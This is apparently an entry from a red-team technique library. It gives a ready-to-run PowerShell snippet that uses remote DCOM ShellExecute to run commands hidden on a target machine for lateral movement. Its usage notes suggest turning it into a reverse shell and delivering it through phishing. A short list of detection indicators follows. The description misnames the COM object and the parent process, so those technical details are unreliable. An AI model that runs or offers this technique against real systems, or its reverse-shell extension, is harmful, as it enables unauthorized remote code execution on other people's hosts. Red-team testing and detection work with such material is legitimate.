---
id: eeda8f52-6036-40d6-9b9a-98f6e03da6dd
name: powershell-dcom-shellexecute-calculator
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:07.161613+00:00'
updated_at: '2023-04-10T20:25:47.024141+00:00'
platforms:
  - Windows
tags:
  - dcom
  - lateral-movement
  - remote-execution
  - powershell
validated: true
---

# PowerShell DCOM ShellExecute Calculator

## Code

```powershell
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```

## Description

This PowerShell code snippet remotely executes the Windows Calculator on a target machine using DCOM by instantiating the WScript.Shell COM object via its CLSID and calling ShellExecute. It is a proof-of-concept for lateral movement, running the command hidden without displaying windows on the target.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 10.10.10.1 | IP address of the target machine (replace with actual target IP before execution) | 192.168.1.100 |

## Usage

Execute this code in a PowerShell session on the attacker's machine with valid credentials for the target. It requires domain authentication or local admin rights. Use for testing DCOM access in red team engagements; extend by changing the executed command (e.g., to launch a reverse shell). Ensure a listener is ready if escalating to malicious payloads. Delivered via initial access vectors like phishing or compromised hosts.

## Detection

- DCOM activation logs (Event ID 10000 in DistributedCOM log) showing CLSID '9BA05972-F6A8-11CF-A442-00A0C90A8F39'.
- PowerShell Script Block Logging capturing the Activator.CreateInstance call.
- Network traffic to TCP 135 and high RPC ports from unexpected sources.
- Process creation of calc.exe or cmd.exe spawning from wscript.exe (via Sysmon Event ID 1).
- AMSI scans for PowerShell code if enabled.

## Related

- [[procedures/dcom-shellexecute-calculator-execution]]
- [[codes/powershell-dcom-shellexecute-calculator]]
